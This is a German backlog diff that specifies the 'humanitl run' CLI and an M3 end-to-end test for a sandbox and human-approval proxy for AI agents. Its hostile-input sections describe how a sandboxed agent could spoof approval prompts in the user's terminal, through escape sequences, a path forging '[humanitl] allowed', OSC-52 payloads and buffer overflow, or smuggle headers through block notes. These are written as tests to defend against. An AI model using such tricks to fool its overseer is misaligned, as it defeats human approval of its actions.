+### Stand (2026-09-04): Größe XL, der Daemon kennt keine Sitzungskonfiguration, vier genannte Dinge gibt es nicht
+
+Audit von 28 Agenten gegen den Code: 16 Widersprüche, 7 blockierend, oben im Text korrigiert. Vorhanden: die HUM-066-Hälfte von `run.rs` (`ctx.config()`, `session_lines`, `not_yet_failure`), der Start-Pfad in `cmd/sandbox.rs` (`start`, `enforce_isolation`, `wait_or_interrupt`, `finish`, `exit_code_of` mit Tests), `Context::connect`/`config`, die `DAEMON_002`-Prüfung in `cmd/daemon.rs`, `client::channel` mit `DAEMON_001`, die vier Kurz-Flags aus dem Schema, `FlowEvent.Held`, `FlowSummary`, `FlowDetail`, `GetBody`, `DecideRequest.remember`/`allow_edited`, `TerminalInput.Open.read_only`, `sanitize_note`, `is_fullscreen_tui`, `rules_document()`/`rule_files()`, die vier Ränge aus HUM-104. Fehlend: alles, was die CLI in den Daemon tragen müsste — und der Daemon selbst. Daher XL statt L.
+
+**Blockierend in der ersten Fassung, jetzt korrigiert:**
+
+- `Sandbox(Start { …, ask_mode, cli_overrides })`: `Start` hat `profile`, `work_dir`, `work_mode`, `command`. Ohne die neuen Felder und ohne einen Daemon, der je Start auflöst, sind `--profile`, `--llm`, `--ask` Dekoration. Das war nirgends genannt und ist der Rumpf des Issues.
+- `Start.profile` meinte das Sitzungsprofil; der Dienst sucht darunter das bwrap-Profil unter `profiles/sandbox/` und antwortet für `llm-only` mit `CONFIG_001`. Jetzt `session_profile` daneben.
+- `--ask none` ⇒ `403`/`AskModeNone`: heute `504`/`TimedOut`, vom Briefing (HUM-071) mit Test zugesichert. Entscheidung (b) statt Behauptung.
+- `run_llm_only_blocks_curl` erwartete `AskModeNone`: die Profilregel `block host "**"` entscheidet vorher (`Block{Rule}`), sobald sie verdrahtet ist; und verdrahtet wird sie **hier** (HUM-104, Nicht-Ziel), was die erste Fassung nicht erwähnte.
+- `humanitl run --ask terminal` mit OpenCode in Kriterium 2 und drei Tests: CONVENTIONS 4.10 verweigert das mit `CLI_002`; der Sprint-Kopf sagte es seit dem 2026-09-02, der Text nicht.
+- Weiter korrigiert: `Subscribe { held_only }` (Feld existiert nicht); `IsolationResult` (heißt `CheckResult`, und der Dienst sendet ihn erst mit HUM-041); `PROJECT_002` und `SESSION_001` (keine Bereiche `PROJECT`/`SESSION`); `--ro`, `--detach`, `attach`, `sessions summary` (nicht in 3.8, kein RPC, `Cmd` ohne `Attach`/`Sessions`); `daemon/crates/ipc/src/service.rs` (existiert nicht); `TerminalInput.detach` als „neues Feld `read_only`" (Feld ist da, auf `Open`); Exit 4 „nur für Tests" (ist `EXIT_SECURITY`); `systemctl --user start humanitld.socket` ohne Unit.
+
+**Offen, hier nicht entschieden:** (a) Sitzungskonfiguration im Daemon (kein anderes Issue in Sprint 3 liefert sie; entweder hier oder als eigenes Issue davor), (b) `504` oder `403` für `--ask none`, (c) die Verweigerung von `--ask terminal` und der Aufruf der drei Tests, (d) `CLI_00n` gegen zwei neue Bereiche, (e) welche PTY-/termios-/Signal-Crates der Elternagent in `daemon/Cargo.toml` aufnimmt (`nix`, `signal-hook`, `expectrl` fehlen alle).
+
+**Seit dem Audit überholt:** HUM-104 ist gemerged (Rang 1 für die Durchreiche, mit Test am Ladeweg); der Kommentar in `profiles/llm-only.toml` beschreibt die Ränge jetzt richtig, seine Aussage „sofort geblockt" für `ask_mode = none` bleibt falsch, solange (b) nicht entschieden ist. HUM-040 ist gemerged; `SandboxService` prüft Profilname und Projektverzeichnis am Socket (CONVENTIONS 4.17).
+
+**Aus dem Audit nicht bestätigt:** nichts Wesentliches; Zeilenanker in `humanitl.proto` (`Start` heute ab Zeile 763) und `ipc/src/sandbox.rs` (`profile_path` um Zeile 1069) sind gewandert.
+
+**Feindliche Eingabe:** vier Stellen, und dieses Issue ist die erste, an der Bytes des Agenten das Terminal des Nutzers erreichen. (1) Der Prompt-Kasten zeichnet Methode, URL, Host, Pfad, `origin_tool`, Fund-Text und Katalogzeile aus der Anfrage des Agenten in ein Terminal, das die CLI selbst in `cfmakeraw` gesetzt hat: `sanitize_note` und Breitenklemme je Feld, sonst fälscht ein Wert eine Kastenkante oder schiebt `[a] allow once` vom Schirm. (2) Der `v`-Pager druckt Rohbytes aus `GetBody`; kein Filter sitzt dort. Der Pager hex-rendert selbst. (3) `e` schreibt Agenten-HTTP in eine Datei und öffnet `$EDITOR`: Modelines und Ähnliches führen fremden Text aus; 0600 im Laufzeitverzeichnis, auf jedem Ausgang löschen, Rückweg validieren (`IPC_004`). (4) Agent-stdout teilt sich das Terminal mit dem Prompt; der Agent kann den 256-KiB-Puffer absichtlich zum Überlaufen bringen und einen falschen Prompt oder ein falsches `[humanitl] allowed` malen — genau der Grund für `CLI_002` bei Vollbild-TUIs. Ohne den HUM-042-Filter auf dem Durchleitungspfad öffnet HUM-067 den Terminal-Seitenkanal wieder, den HUM-042 schließt. Schon gedeckt: `POST http://humanitl.internal/ask` (`meta.rs`, `sanitize_note`), und das Projekt-Profil kann `hold.ask_mode`, `sandbox.*`, `agent.*`, `llm.*` nicht setzen (`x-project-scope = "denied"`, `CONFIG_003`/`CONFIG_009`) — solange `run.rs` `ctx.config()` vor allem anderen ruft.
 
 ### Fallstricke
-- **Prompt und Agent-Ausgabe im selben Terminal.** Ohne Pufferung überschreibt der Agent den Prompt. Pufferung mit Cap; wenn der Cap erreicht ist, wird der Prompt neu gezeichnet, nachdem die Ausgabe durchgeleitet wurde (einfacher als Cursor-Save/Restore, robust gegen TUI-Vollbild). Alternative nur für Vollbild-TUIs wie OpenCode: Prompt in die Statuszeile ist nicht möglich; deshalb Empfehlung in `docs/cli.md`: `--ask terminal` für Shell-Sessions, `--ask ui` oder `none` für TUI-Agenten.
+- **Prompt und Agent-Ausgabe im selben Terminal.** Ohne Pufferung überschreibt der Agent den Prompt. Pufferung mit Cap; wenn der Cap erreicht ist, wird der Prompt neu gezeichnet, nachdem die Ausgabe gefiltert durchgeleitet wurde. Empfehlung in `docs/cli.md`: `--ask terminal` für Shell-Sessions, `--ask ui` oder `none` für TUI-Agenten; für OpenCode erzwingt `CLI_002` das.
 - Raw-Mode ohne Restore macht das Terminal unbrauchbar. Restore in `Drop`, Panic-Hook und Signal-Handler, dreifach.
 - `$EDITOR` kann ein GUI-Editor sein, der sofort zurückkehrt (`code` ohne `--wait`). Hinweis in der Prompt-Zeile: „waiting for editor to close".
-- Ein zweites `humanitl run` im selben cwd ⇒ `SESSION_001` (Blocking): "A session for this folder is already running (id …). Attach with `humanitl attach <id>`."
+- Ein zweites `humanitl run` im selben cwd ⇒ `CLI_00n` (Blocking): "A session for this folder is already running (id …)." Ohne `attach` nennt der Text keinen Anhänge-Befehl.
 - `--llm` mit öffentlicher IP ⇒ `LLM_006` wird vor dem Start gedruckt, Start läuft trotzdem (Info).
+- `ctx.config()` bleibt der erste Aufruf; alles, was vorher startet, umgeht den `CONFIG_003`-Riegel.
 
 ### Referenzen
-BACKLOG.md ADR-013, Abschnitt 1.3 Prinzip 9; CONVENTIONS.md 3.8; HUM-042 (Terminal), HUM-066 (Profile). pipelock `action: ask` (https://github.com/luckyPipewrench/pipelock), `termios(3)`, `expectrl` (Crate).
+BACKLOG.md ADR-013, Abschnitt 1.3 Prinzip 9; CONVENTIONS.md 3.2, 3.8, 4.5, 4.10, 4.17, 4.23; HUM-041, HUM-042 (Terminal), HUM-066 (Profile), HUM-104 (Reihenfolge). pipelock `action: ask` (https://github.com/luckyPipewrench/pipelock), `termios(3)`.
 
 ---
 
 ## HUM-046 · Demo-Skript M3
-Sprint: 3 · Größe: S · Abhängigkeiten: alle Issues dieses Sprints · Blockiert: Sprint 4
+Sprint: 3 · Größe: L · Abhängigkeiten: HUM-037, HUM-038, HUM-039, HUM-066, HUM-071, HUM-072, HUM-073, HUM-104 (gebaut); hart für die volle Fassung: HUM-041 (Check-Ereignisse), HUM-042 (Terminal und Hinweiszeile), HUM-043 (Summary), HUM-067 (`humanitl run`); nur für die `https`-Variante von STEP3: HUM-087 · Blockiert: Sprint 4
 
 ### Kontext
-Jeder Sprint endet mit einem grünen Demo-Skript in CI (BACKLOG.md Abschnitt 8). M3 beweist: Agent in der Sandbox, LLM-Passthrough, Default-Regeln greifen, ein Hold wird per gRPC entschieden, das Ergebnis erscheint im Terminal-Stream. Da echtes OpenCode und ein echtes LLM in CI nicht verfügbar sind, laufen zwei Varianten: `agent-e2e` mit Mock-LLM und Mock-Agent (immer), und `agent-real` mit OpenCode gegen den Mock-LLM (nur wenn `opencode` im Runner-Image ist, sonst übersprungen).
+Jeder Sprint endet mit einem grünen Demo-Skript in CI (BACKLOG.md Abschnitt 8). M3 beweist: Agent in der Sandbox, LLM-Passthrough, Default-Regeln greifen, ein Hold wird per gRPC entschieden, das Ergebnis erscheint beim Agenten. Da echtes OpenCode und ein echtes LLM in CI nicht verfügbar sind, laufen zwei Varianten: `agent-e2e` mit Mock-LLM und Skript-Agent (immer), und `agent-real` mit OpenCode gegen den Mock-LLM (nur wenn `opencode` im Runner-Image ist, sonst als `skip` gemeldet, nie als `pass`).
 
 ### Ziel
-`tests/e2e/m3_agent_inside.rs` startet den Daemon, den Ollama-Mock, eine Session mit Profil `default` und einem Skript-Agenten (`sh`), und prüft die fünf Demo-Schritte automatisch. Ein zweiter Test nutzt `humanitl run --ask none`. CI-Job `e2e-agent` führt beide aus.
+`tests/e2e/m3_agent_inside/run.sh` startet über `tests/e2e/lib.sh` den Daemon, den Ollama-Mock und eine Sandbox mit Profil `default` und einem Skript-Agenten (`sh`), und prüft die Demo-Schritte automatisch, mit fester Zahl an Zusicherungen wie M2. CI-Job `e2e-agent` führt den Lauf aus. Was HUM-041, HUM-042, HUM-043 und HUM-067 voraussetzt, steht im Lauf als Stolperdraht, der rot wird, sobald das Fehlende da ist, und bis dahin ausdrücklich als offen gemeldet wird.
 
 ### Nicht-Ziel
-Keine UI-Automation (das ist `e2e-xvfb` in Sprint 4). Keine Performance-Messung.
+Keine UI-Automation von M3 (der Job `e2e-xvfb` existiert und fährt heute M2; die Bildschirm-Hälfte von M3 kommt später dorthin). Keine Performance-Messung. Keine Rust-Testcrate, keine Cargo-Features, kein `axum`, kein `expectrl` (siehe Stand). Kein Test-Hebel `experimental.upstream_override` (existiert nicht, und `experimental.upstream_port_map` wird mit HUM-088 entfernt statt gebaut).
 
 ### Betroffene Pfade
-- `tests/e2e/mock_llm/` (neu): axum-Server
-- `tests/e2e/m3_agent_inside.rs` (neu)
-- `tests/e2e/fixtures/agent_script.sh` (neu)
-- `.github/workflows/ci.yml`: Job `e2e-agent`
+- `tests/e2e/m3_agent_inside/run.sh` (neu), `config.toml` (neu, nach dem Muster `m2_first_decision/config.toml` mit `@UPSTREAM_ADDR@` und `resolver.overrides`), `agent_script.sh` (neu)
+- `tests/e2e/mock_llm/mock_llm.py` (neu): `ThreadingHTTPServer` nach dem Vorbild `tests/e2e/fake-upstream/fake_upstream.py`
+- `tests/e2e/run.sh`: Zweig `E2E_ONLY=m3`
+- `.github/workflows/ci.yml`: Job `e2e-agent`, kopiert von `e2e-xvfb` ohne Flutter (AppArmor-userns-Schritt, `bubblewrap curl jq python3 iproute2 util-linux musl-tools`, 30 min, `target/e2e` als Artefakt)
+- `backlog/CONVENTIONS.md`: Abschnitt 4.25 in der Form von 4.22 (Abweichungen und die Liste dessen, was bis HUM-041/042/043/067/087 offen bleibt)
 - `tests/e2e/README.md`
+
+Gestrichen: `tests/e2e/m3_agent_inside.rs`, `tests/e2e/mock_llm/` als axum-Bin, `tests/e2e/fixtures/agent_script.sh` per `SandboxFile`, `daemon/Cargo.toml`, `tools/deps-allow.toml`.
 
 ### Spezifikation
 
-Ollama-Mock (`mock_llm`, axum, Port aus `--port`, Default 0 = zufällig, Ausgabe des Ports auf stdout):
+Ollama-Mock (`mock_llm.py`, bindet die Adresse, die der Lauf übergibt, schreibt `READY http=<port>` auf stdout, eine Zugriffszeile je Anfrage in festem Format auf stderr):
 
 - `GET /api/tags` ⇒ `{"models":[{"name":"mock:latest","modified_at":"2026-09-01T00:00:00Z","size":1}]}`
 - `GET /v1/models` ⇒ `{"object":"list","data":[{"id":"mock","object":"model"}]}`
-- `POST /v1/chat/completions` mit `stream: true` ⇒ SSE mit 10 Chunks à `{"choices":[{"delta":{"content":"tok{i} "}}]}` im Abstand 30 ms, dann `data: [DONE]`; ohne `stream` ⇒ eine JSON-Antwort mit `content: "mock reply"`. Der Mock speichert den letzten Request-Body unter `GET /_debug/last` (nur für Tests).
+- `POST /v1/chat/completions` mit `stream: true` ⇒ SSE mit 10 Chunks à `{"choices":[{"delta":{"content":"tok{i} "}}]}` im Abstand 30 ms, je Chunk ein ausdrücklicher `flush`, dann `data: [DONE]`; ohne `stream` ⇒ eine JSON-Antwort mit `content: "mock reply"`. Der Mock speichert den letzten Request-Body unter `GET /_debug/last` (nur für den Testprozess auf dem Host; aus der Sandbox träfe der Pfad keines der Durchreich-Präfixe aus `opencode.rs` und würde gehalten).
 - `POST /api/chat` analog im Ollama-Format (`{"message":{"content":"tok"},"done":false}` NDJSON).
+- Eigener Test ohne Daemon: `python3 mock_llm.py` plus ein `curl`, das zehn `data:`-Rahmen zählt, damit ein roter M3-Lauf von einem kaputten Mock unterscheidbar ist.
 
-Agent-Skript (`agent_script.sh`, läuft in der Sandbox als `-- sh /tests/agent_script.sh`; die Datei wird per `SandboxFile` eingespielt):
+Netz: beide Ziele liegen im eigenen Namensraum des Laufs auf `198.51.100.7` (`E2E_FAKE_ADDR`, `e2e_enter_namespace` in `lib.sh`): der LLM-Mock auf einem hohen Port, das zweite Ziel (`fake_upstream.py`) auf Port 80, `example.com` per `resolver.overrides` dorthin. **Nie `127.0.0.1` für das zweite Ziel:** `daemon/crates/proxy/src/upstream.rs` macht aus jeder aufgelösten privaten Adresse `UpstreamError::PrivateAddress`, sofern die entscheidende Regel nicht `allow_private` trägt, und ein `Decide{Allow}` eines Menschen setzt das nie — der Fluss endete immer als `502 upstream_private_address` (CONVENTIONS 4.22). Nur die Durchreiche darf auf Loopback liegen, weil `llm_passthrough` in `opencode.rs` `.with_allow_private(true)` setzt.
+
+Daemon: `start_daemon STATE_DIR XDG_DIR [HOLD]` aus `lib.sh` (baut den Wegwerf-XDG-Baum, kopiert die Sandbox-Profile, wartet auf beide Sockets). `humanitld` hat kein `--config`; seine Schalter sind `--fake`, `--speed`, `--loop`, `--scale-timeouts`, `--hold-timeout-secs`, `--event-buffer`, `--socket`. Der Endpoint kommt über die Umgebung, neben `HUMANITL_HOLD__TIMEOUT_SECS`: `HUMANITL_LLM__ENDPOINT=http://198.51.100.7:<port>`, damit `llm_passthrough_rule` in `main.rs` die Durchreiche beim Start baut (Rang 1, CONVENTIONS 4.5).
+
+Agent-Skript (`agent_script.sh`; wird nach `$E2E_WORKDIR/work` kopiert und als `sandbox_run /bin/sh /work/agent_script.sh &` gestartet, wie M2 seinen Agenten startet — `SandboxFile` entsteht nur aus `AgentAdapter::files` und muss außerhalb von `/work` liegen, `/tests` ist im Profil `default` kein Mount):
 
 ```sh
 #!/bin/sh
@@ -1649,54 +1893,79 @@ curl -sS -X POST "$LLM/v1/chat/completions" -H 'content-type: application/json' 
 echo; echo "STEP2 modelsdev"
 curl -sS -o /dev/null -w '%{http_code}\n' https://models.dev/api.json
 echo "STEP3 webfetch"
-curl -sS -o /dev/null -w '%{http_code}\n' https://example.com/docs
+curl -sS -o /dev/null -w '%{http_code}\n' http://example.com/docs
 echo "STEP4 done"
 ```
 
-`$LLM` wird über `sandbox.env` gesetzt (Test setzt `--llm http://127.0.0.1:<port>`; der Mock läuft auf dem Host, die Sandbox erreicht ihn ausschließlich über den Proxy-Passthrough, weil sie kein Interface hat).
+`$LLM` wird über `sandbox.env` in der `config.toml` des Laufs gesetzt. STEP3 läuft über `http://`, bis HUM-087 `--allow-test-ca` liefert: `ClientTls::new(&[], …)` in `main.rs` hat eine leere Wurzelliste, jede TLS-Anfrage an ein lokales Ziel endet heute `502 upstream_tls` (CONVENTIONS 4.22). Der Kopf des Laufs sagt, dass der MITM-Pfad bis dahin ungeprüft bleibt.
 
-Testablauf `m3_agent_inside`:
+Testablauf `m3_agent_inside` (Shell, `e2e_check`/`e2e_expect` zählen):
 
-1. Daemon im Testmodus starten (`humanitld --config <tmp> --socket <tmp>/daemon.sock`), Mock starten, Port lesen.
-2. gRPC-Client: `Sandbox(Start { profile: "default", work_dir: <tmp-projekt>, cli_overrides: { llm.endpoint, agent.command: ["sh","/tests/agent_script.sh"] } })`.
-3. Erwartung A: drei `IsolationResult` mit `passed: true`, dann `Status(running)`.
-4. `Terminal`-Stream öffnen (read-only), Ausgabe sammeln.
-5. Erwartung B (STEP1): innerhalb 5 s ein Flow `Decided { passthrough: true }` zu `127.0.0.1:<port>` `/v1/chat/completions`; Terminal-Ausgabe enthält `tok0`; Mock `/_debug/last` enthält `"hello"`.
-6. Erwartung C (STEP2): Flow zu `models.dev` mit `Decided(Block { reason: Rule(<id …0001>) })`, kein `Held`; Terminal zeigt `403`.
-7. Erwartung D (STEP3): Flow zu `example.com` mit `Held`; Terminal-Stream enthält `[humanitl] request held: GET example.com/docs`. Der Test sendet `Decide { Allow }`. Da CI keinen Internetzugang garantiert, läuft für diesen Schritt ein zweiter lokaler Mock als Upstream: der Test setzt im Daemon-Testmodus `experimental.upstream_override = "127.0.0.1:<port2>"` (Testmodus-Flag, im Produktions-Build nicht vorhanden, `#[cfg(feature = "test-hooks")]`), der Mock antwortet `200`. Terminal zeigt `200`, Flow `Recorded`, Terminal zeigt `[humanitl] allowed`.
-8. Erwartung E (STEP4): `Exit { code: 0 }`, `SessionEnded { summary }` mit `changes.len() == 0`.
-9. History-Prüfung via `ListFlows`: genau 3 Flows in der Reihenfolge Passthrough, Block, Allow; Audit-Kette (falls HUM-050 bereits vorhanden, sonst übersprungen) verifiziert.
+1. Namensraum betreten, Mock und `fake_upstream.py` starten, `READY` lesen, `start_daemon` mit Endpoint.
+2. `sandbox_run` im Hintergrund mit `-v`; Erwartung A: die drei Zeilen `check <name> pass|FAIL: <evidence>` auf stderr, alle `pass` (der CLI-Lauf endet fail-closed mit Exit 3, wenn eine rot ist). Stolperdraht: sobald `daemon/crates/ipc/src/sandbox.rs` `SandboxEvent.check` sendet (HUM-041), wird der Lauf rot und die Prüfung wandert auf den RPC.
+3. Erwartung B (STEP1), aus drei Quellen: `humanitl --json flows list 'host:198.51.100.7'` mit `include_passthrough` zeigt einen Fluss mit `decision_source == passthrough` (`FlowEvent.Decided` hat kein Feld `passthrough`; das Merkmal ist `DecisionSource::Passthrough`, CONVENTIONS 4.21); die aufgefangene Agentenausgabe enthält `tok0`; `/_debug/last` des Mocks enthält `"hello"`.
+4. Erwartung C (STEP2): Fluss zu `models.dev` mit `Decided(Block { reason: Rule(01920000-0000-7000-8000-000000000001) })` (`rules/default.yaml`), kein `Held`; der Agent sah `403`.
+5. Erwartung D (STEP3): `wait_for_held 10 'host:example.com'`, `flow_decide <id> allow`; der Agent sah `200`, die Zeile endet `Recorded`. Stolperdraht auf der fehlenden Hinweiszeile `[humanitl] request held`: rot, sobald `server.rs` für `Terminal` nicht mehr `unimplemented` liefert (HUM-042); bis dahin sagt der Kopf, dass die Hinweis-Hälfte unbewiesen ist.
+6. Erwartung E (STEP4): Exit 0 von `sandbox_run` und ein `find` über das Projektverzeichnis, das es unverändert zeigt. `SessionSummary`, `SessionEnded` und `humanitl sessions summary` gibt es nicht (HUM-043); Stolperdraht auf `Cmd::Sessions`.
+7. Historie: genau drei Flüsse in der Reihenfolge Passthrough, Block, Allow. `ListFlows` versteckt Durchreich-Flüsse ohne `include_passthrough` und sortiert neueste zuerst; `humanitl flows list` hat `--asc`, aber keinen Schalter für `include_passthrough`. Der Lauf hält diese Paritätslücke im Kopf fest (wie CONVENTIONS 4.22 die von `flows decide`), statt am CLI vorbei einen gRPC-Client zu bauen (CONVENTIONS 3.11).
+8. Audit-Kette nur, wenn HUM-050 da ist (`Audit` ist `unimplemented`).
+9. Zusatz zur Hinweiszeile, sobald HUM-042 steht: eine vierte Anfrage an einen Host mit Pfad, der `\r\n[humanitl] allowed` und eine OSC-52-Nutzlast trägt; Erwartung: genau ein `[humanitl] allowed` im Transkript, kein `ESC ]`. Bis dahin: Transkript als Bytes auffangen und zusichern, dass kein `ESC ]` durchkommt — die Lücke wird gemessen, nicht angenommen.
+10. Block mit Notiz (HUM-072, Sprint-Kopf): eine Notiz mit `\r`, `\n` und einem Steuerbyte; der Kopf `X-Humanitl-Note`, den der Agent sieht, ist einzeilig.
 
-Zweiter Test `m3_cli_llm_only`: `humanitl run --profile llm-only --llm http://127.0.0.1:<port> --work <tmp> -- sh /tests/agent_script.sh` über `expectrl`; Erwartung: STEP1 zeigt `tok0`, STEP2 und STEP3 zeigen `403`, kein `Held` in `ListFlows`, Exit 0.
+Zweiter Test `m3_cli_llm_only` (`humanitl run --profile llm-only --llm … --work <tmp> -- sh /work/agent_script.sh`): erst mit HUM-067. `run.rs` endet heute mit `not_yet_failure("humanitl run", "HUM-067")`, und die `403` für STEP2/STEP3 setzt HUM-067s Verdrahtung von `Profile::rules_document()` voraus (`block host "**"` aus `profiles/llm-only.toml` hat außerhalb von Tests keinen Leser); `ask_mode = none` allein liefert heute `504`/`TimedOut`, nicht `403` (`main.rs`: `AskMode::None => Duration::ZERO`). HUM-067 bringt seine eigenen `run_llm_only_*`-Tests mit; hier nur der Stolperdraht auf `humanitl run --help`.
 
-Dritter Test `m3_real_opencode` (`#[ignore]`, in CI nur wenn `which opencode` erfolgreich): Profil `default`, Adapter OpenCode, `--ask none`; Erwartung: innerhalb 30 s Terminal-Ausgabe enthält den OpenCode-Prompt-Marker (String aus `agents/opencode/README.md`, z. B. das TUI-Banner), `ListFlows` enthält höchstens einen `Held` (npm-Ask) und keinen Flow zu `models.dev` mit anderem Zustand als Block; Passthrough-Flow zu `/v1/models` vorhanden.
+Dritter Test `m3_real_opencode` (nur wenn `command -v opencode`): Profil `default`, Adapter OpenCode, `--ask none`; Erwartung: Passthrough-Fluss zu `/v1/models`, kein Fluss zu `models.dev` (heute `models.opencode.ai`, CONVENTIONS 4.17) in einem anderen Zustand als Block, höchstens ein `Held`. Kein „Prompt-Marker aus `agents/opencode/README.md`": die Datei enthält weder Banner noch Marker noch TUI-String; wer einen will, misst ihn an einem echten Lauf und schreibt ihn hier hinein.
 
-CI-Job `e2e-agent`: Ubuntu-Runner, installiert `bubblewrap`, `curl`, `socat`; führt `cargo test -p humanitl-e2e --features escape,test-hooks -- m3_` aus; Artefakte: Daemon-Log, Terminal-Transkript, `humanitl flows list --json`.
+CI-Job `e2e-agent`: `E2E_ONLY=m3`, Artefakte Daemon-Log, Agenten-Transkript, `humanitl flows list --json`. Kein `shellcheck` (steht in keinem Job, nicht im `Makefile`, nicht in AGENTS.md); POSIX bleibt Sache des Reviews wie bei jedem vorhandenen e2e-Skript.
 
 ### Schritte
-1. `mock_llm` schreiben (axum, ~120 Zeilen), eigener Cargo-Bin unter `tests/e2e`.
-2. `test-hooks`-Feature mit `upstream_override` im Proxy (nur Testbuild).
-3. `agent_script.sh`, Einspielung als `SandboxFile`.
-4. Drei Tests, Hilfsfunktionen für Daemon-Start und Event-Warten mit Timeouts.
-5. CI-Job, Artefakt-Upload.
-6. README mit lokalem Aufruf.
+1. Pfadliste auf die Shell-Harness umstellen (oben geschehen).
+2. `mock_llm.py` samt eigenem Test.
+3. Beide Ziele im Namensraum, `config.toml` mit `resolver.overrides` und `sandbox.env`.
+4. `agent_script.sh` nach `/work`, `run.sh` mit fester Zusicherungszahl (`M3_EXPECTED_ASSERTIONS`) und `collect`-Trap wie M2.
+5. Stolperdrähte für HUM-041, HUM-042, HUM-043, HUM-067, HUM-087.
+6. `E2E_ONLY=m3`, CI-Job, README, CONVENTIONS 4.25.
+7. Erst danach, als eigene Nachträge: Hinweiszeile, Summary, `run --profile llm-only`, `https`-Bein.
 
 ### Tests
-Die Tests sind das Deliverable. Zusätzlich: `mock_llm_streams_sse` (Mock isoliert), `agent_script_is_posix` (`shellcheck -s sh`).
+Die Läufe sind das Deliverable. Zusätzlich: `mock_llm_streams_sse` (Mock isoliert, ohne Daemon).
 
 ### Akzeptanzkriterien
-- [ ] `e2e-agent` grün in CI, Laufzeit unter 3 min.
-- [ ] Lokal mit installiertem OpenCode: `cargo test -- --ignored m3_real_opencode` grün.
-- [ ] Artefakte enthalten das Terminal-Transkript mit `[humanitl] request held` und `[humanitl] allowed`.
+- [ ] `e2e-agent` grün in CI, Laufzeit unter 3 min, Zusicherungszahl stimmt.
+- [ ] Lokal mit installiertem OpenCode: `m3_real_opencode` grün; ohne OpenCode meldet der Lauf `skip`, nie `pass`.
+- [ ] Artefakte enthalten das Agenten-Transkript; `[humanitl] request held` und `[humanitl] allowed` darin, sobald HUM-042 steht (bis dahin als offen gemeldet, mit Stolperdraht).
+
+### Stand (2026-09-04): Größe L, zwei Drittel trägt die Shell-Harness, der Rest wartet auf vier ungebaute Issues
+
+Audit von 28 Agenten gegen den Code: 20 Widersprüche, 10 blockierend, oben im Text korrigiert. Was trägt: `tests/e2e/lib.sh` (Namensraum mit `198.51.100.7` auf `lo`, `start_daemon`, `sandbox_run`, `wait_for_held`, `flow_decide`, Zusicherungszähler), `m2_first_decision/run.sh` als Vorlage, `fake_upstream.py` und `fake_agent.py` in Python, die `config.toml`-Vorlage, `rules/default.yaml` mit der Block-Regel `…0001`, die Durchreiche mit `allow_private` und engen Präfixen, die vier Ränge aus HUM-104, `ListFlows` mit `include_passthrough`, die Jobs `e2e` und `e2e-xvfb`. Daher L statt S: die erste Fassung setzte eine Crate, zwei Features, ein Proto-Feld, einen Konfigurationsschlüssel und vier ungebaute Issues voraus.
+
+**Blockierend in der ersten Fassung, jetzt korrigiert:**
+
+- `tests/e2e/m3_agent_inside.rs`, `cargo test -p humanitl-e2e --features escape,test-hooks`: keine Crate `humanitl-e2e` unter den Workspace-Mitgliedern, kein `[features]` in irgendeiner `Cargo.toml`. Das Gate ist Shell.
+- `experimental.upstream_override` hinter `#[cfg(feature = "test-hooks")]`: kommt in keiner Datei außer dieser Spezifikation vor.
+- Zweites Ziel auf `127.0.0.1` mit `200`: unmöglich, `PrivateAddress` (siehe Netz).
+- `Sandbox(Start { cli_overrides })`: `Start` hat `profile`, `work_dir`, `work_mode`, `command`; `agent.command` deckt `command`, der Endpoint geht über die Umgebung.
+- Drei `IsolationResult` aus `Sandbox(Start)`: Typ heißt `CheckResult`, und der Dienst sendet ihn nicht (HUM-041).
+- `Terminal`-Stream und die Hinweiszeilen: `unimplemented("Terminal", "HUM-042")`; `TerminalOutput` hat kein `Notice`, `ui.terminal_notices` steht nicht in `UiConfig`.
+- `SessionEnded { summary }` und `humanitl sessions summary`: nirgends (HUM-043).
+- `humanitld --config`: den Schalter gibt es nicht.
+- `humanitl run --profile llm-only` als zweiter Test: `run.rs` startet nichts (HUM-067), und `403` verlangt dessen Regel-Verdrahtung.
+- Weiter korrigiert: axum-Bin (CONVENTIONS 4.22 hat dieselbe Vorgabe schon einmal verworfen); `SandboxFile` von außen (kein Mechanismus, und keiner nötig); `expectrl` (in keinem Manifest); `ListFlows` ohne `include_passthrough` und Reihenfolge; `https` in STEP3 ohne Wurzel; `Decided { passthrough: true }` (Merkmal ist `DecisionSource`); „`e2e-xvfb` in Sprint 4" (existiert, fährt M2); Prompt-Marker aus einer README ohne Marker; `shellcheck` ohne Werkzeug im Gate.
+
+**Offen, hier nicht entschieden:** ob HUM-041, HUM-042, HUM-043, HUM-067 vor HUM-046 fertig werden oder der Lauf mit Stolperdrähten zuerst landet (Empfehlung des Audits: zuerst der Lauf, die vier Nachträge als eigene Issues); ob `humanitl flows list` einen Schalter für `include_passthrough` bekommt (Paritätslücke, ADR-018).
+
+**Aus dem Audit nicht bestätigt:** die Aussage, HUM-101 (`backlog/sprint-3.md`) nenne `upstream_override` ausdrücklich — HUM-101 tut das nicht; der Bezeichner steht nur in diesem Issue. Die Zeile `rules/default.yaml:38` ist heute Zeile 45.
+
+**Feindliche Eingabe:** drei Stellen, eine davon ist der Zweck des Laufs. (1) Die Hinweiszeile im Terminal wird aus Methode, Host und Pfad des Agenten gebaut und in den Strom geschrieben, den ein Mensch liest; ein Pfad mit CR, LF oder CSI fälscht eine zweite Zeile oder überschreibt die echte. M3 ist der einzige Lauf mit echtem Agenten, echtem Halten und echtem Terminal zugleich; Schritt 9 misst deshalb die Fälschung, nicht nur das Erscheinen. (2) Die Antwortkörper des Agenten (SSE-Token, Block-Body) landen im aufgefangenen stdout, das als CI-Artefakt im Browser geöffnet wird — der deklarierte Kanal aus BACKLOG.md 4.2; bis HUM-042 wird gemessen, dass kein `ESC ]` durchkommt. (3) Die Block-Notiz aus HUM-072 geht in den Kopf `X-Humanitl-Note` und den 403-Body; die Proto beschreibt die Säuberung (500 Zeichen, CR/LF zu Leerzeichen, Steuerzeichen unter 0x20 außer Tab entfernt); ein Header-Splitting wäre ein Request-Smuggling-Primitiv, kein Schönheitsfehler, deshalb Schritt 10. Keine Grenze: `/_debug/last`, nur vom Host erreichbar.
 
 ### Fallstricke
-- Der Passthrough zu `127.0.0.1:<port>` funktioniert nur, weil der Proxy auf dem Host läuft und dort Loopback erreicht. In der Sandbox gibt es kein Loopback zum Host. Das ist die gewollte Architektur; der Test dokumentiert das.
-- Regel-Engine: `HostName::Ip(127.0.0.1)` matcht nur die Passthrough-Regel (exakt); ein zweiter Mock-Port braucht `upstream_override`, nicht eine zweite IP-Regel.
-- Timing: Isolation-Checks brauchen auf CI-Runnern bis zu 2 s (nftw). Warte-Timeouts großzügig (10 s), aber Gesamtlaufzeit begrenzen.
